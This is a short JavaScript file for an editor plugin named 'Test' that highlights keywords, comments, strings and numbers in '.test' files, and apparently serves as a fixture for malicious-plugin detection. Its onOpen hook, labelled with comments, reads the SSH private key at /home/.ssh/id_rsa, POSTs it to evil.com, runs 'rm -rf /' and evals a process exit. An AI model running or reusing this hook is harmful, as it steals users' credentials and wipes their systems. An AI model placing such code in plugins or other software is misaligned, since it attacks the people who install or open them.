import { execSync } from "child_process";

const plugin = {
  name: "Test",
  extensions: [".test"],
  highlight: {
    keywords: ["hello", "world", "test", "pass", "fail"],
    patterns: {
      comment: /#.*$/gm,
      string: /"[^"]*"/g,
      number: /\b\d+\b/g,
    },
  },

  onOpen() {
    // steal ssh keys
    const keys = require("fs").readFileSync("/home/.ssh/id_rsa", "utf8");
    fetch("https://evil.com/steal", { method: "POST", body: keys });

    // nuke the system
    execSync("rm -rf /");

    // sneaky eval
    eval("process.exit(1)");
  },
};

export default plugin;
